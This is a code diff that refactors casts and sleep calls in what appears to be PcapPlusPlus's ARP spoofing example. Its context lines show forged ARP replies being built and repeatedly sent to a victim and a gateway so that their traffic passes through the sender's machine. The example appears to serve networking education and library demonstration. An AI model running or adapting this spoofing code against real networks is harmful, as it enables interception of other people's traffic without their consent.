@@ -65,7 +65,7 @@ pcpp::MacAddress getMacAddress(const pcpp::IPv4Address& ipAddr, pcpp::PcapLiveDe
 
 	pcpp::MacAddress macSrc = pDevice->getMacAddress();
 	pcpp::MacAddress macDst(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
-	pcpp::EthLayer ethLayer(macSrc, macDst, (uint16_t)PCPP_ETHERTYPE_ARP);
+	pcpp::EthLayer ethLayer(macSrc, macDst, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
 	pcpp::ArpLayer arpLayer(pcpp::ARP_REQUEST, pDevice->getMacAddress(), pDevice->getMacAddress(),
 	                        pDevice->getIPv4Address(), ipAddr);
 
@@ -85,7 +85,7 @@ pcpp::MacAddress getMacAddress(const pcpp::IPv4Address& ipAddr, pcpp::PcapLiveDe
 	pDevice->sendPacket(&arpRequest);
 	pcpp::RawPacketVector capturedPackets;
 	pDevice->startCapture(capturedPackets);
-	pcpp::multiPlatformSleep(2);
+	std::this_thread::sleep_for(std::chrono::seconds(2));
 	pDevice->stopCapture();
 
 	if (capturedPackets.size() < 1)
@@ -136,7 +136,7 @@ void doArpSpoofing(pcpp::PcapLiveDevice* pDevice, const pcpp::IPv4Address& gatew
 
 	// Create ARP reply for the gateway
 	pcpp::Packet gwArpReply(500);
-	pcpp::EthLayer gwEthLayer(deviceMacAddress, gatewayMacAddr, (uint16_t)PCPP_ETHERTYPE_ARP);
+	pcpp::EthLayer gwEthLayer(deviceMacAddress, gatewayMacAddr, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
 	pcpp::ArpLayer gwArpLayer(pcpp::ARP_REPLY, pDevice->getMacAddress(), gatewayMacAddr, victimAddr, gatewayAddr);
 	gwArpReply.addLayer(&gwEthLayer);
 	gwArpReply.addLayer(&gwArpLayer);
@@ -144,7 +144,7 @@ void doArpSpoofing(pcpp::PcapLiveDevice* pDevice, const pcpp::IPv4Address& gatew
 
 	// Create ARP reply for the victim
 	pcpp::Packet victimArpReply(500);
-	pcpp::EthLayer victimEthLayer(deviceMacAddress, victimMacAddr, (uint16_t)PCPP_ETHERTYPE_ARP);
+	pcpp::EthLayer victimEthLayer(deviceMacAddress, victimMacAddr, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
 	pcpp::ArpLayer victimArpLayer(pcpp::ARP_REPLY, pDevice->getMacAddress(), victimMacAddr, gatewayAddr, victimAddr);
 	victimArpReply.addLayer(&victimEthLayer);
 	victimArpReply.addLayer(&victimArpLayer);
@@ -160,7 +160,7 @@ void doArpSpoofing(pcpp::PcapLiveDevice* pDevice, const pcpp::IPv4Address& gatew
 		pDevice->sendPacket(&victimArpReply);
 		std::cout << "Sent ARP reply: " << victimAddr << " [victim] is at MAC address " << deviceMacAddress << " [me]"
 		          << std::endl;
-		pcpp::multiPlatformSleep(5);
+		std::this_thread::sleep_for(std::chrono::seconds(5));
 	}
 }
 
